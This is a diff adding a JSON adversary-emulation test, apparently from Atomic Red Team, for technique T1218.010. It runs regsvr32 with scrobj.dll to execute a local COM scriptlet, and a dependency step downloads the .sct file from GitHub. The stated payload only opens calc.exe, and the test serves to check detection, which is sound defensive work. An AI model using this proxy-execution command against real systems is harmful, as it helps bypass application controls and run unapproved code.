@@ -1,0 +1,98 @@
+{
+  "id": "449aa403-6aba-47ce-8a37-247d21ef0306",
+  "name": "Regsvr32 local COM scriptlet execution",
+  "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "92f13405-3433-4032-bba8-5e13da8d95e9",
+      "type": "execute-command",
+      "data": {
+        "command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:\"#{filename}\" scrobj.dll\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7aa01828-e30a-4def-9381-650720dddd5f",
+      "name": "Check dependency 1/1",
+      "description": "Regsvr32.sct must exist on disk at specified location (#{filename})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "93e3bb8c-c9fc-4487-b483-d49a19623cdc",
+      "name": "Resolve dependency 1/1",
+      "description": "Regsvr32.sct must exist on disk at specified location (#{filename})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct\" -OutFile \"#{filename}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "82b103f8-75a8-4b36-af6a-db5db1890ee9",
+      "name": "Re-check dependency 1/1",
+      "description": "Regsvr32.sct must exist on disk at specified location (#{filename})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "7aa01828-e30a-4def-9381-650720dddd5f",
+      "p": "on-success",
+      "o": "92f13405-3433-4032-bba8-5e13da8d95e9"
+    },
+    {
+      "s": "7aa01828-e30a-4def-9381-650720dddd5f",
+      "p": "on-failure",
+      "o": "93e3bb8c-c9fc-4487-b483-d49a19623cdc"
+    },
+    {
+      "s": "93e3bb8c-c9fc-4487-b483-d49a19623cdc",
+      "p": "on-success",
+      "o": "82b103f8-75a8-4b36-af6a-db5db1890ee9"
+    },
+    {
+      "s": "82b103f8-75a8-4b36-af6a-db5db1890ee9",
+      "p": "on-failure",
+      "o": "92f13405-3433-4032-bba8-5e13da8d95e9"
+    }
+  ],
+  "tags": [
+    "T1218.010",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "regsvr32name",
+      "type": "string",
+      "description": "Default name of Regsvr32.exe",
+      "value": "regsvr32.exe"
+    },
+    {
+      "name": "filename",
+      "type": "path",
+      "description": "Name of the local file, include path.",
+      "value": "PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct"
+    },
+    {
+      "name": "regsvr32path",
+      "type": "path",
+      "description": "Default location of Regsvr32.exe",
+      "value": "C:\\Windows\\system32"
+    }
+  ]
+}
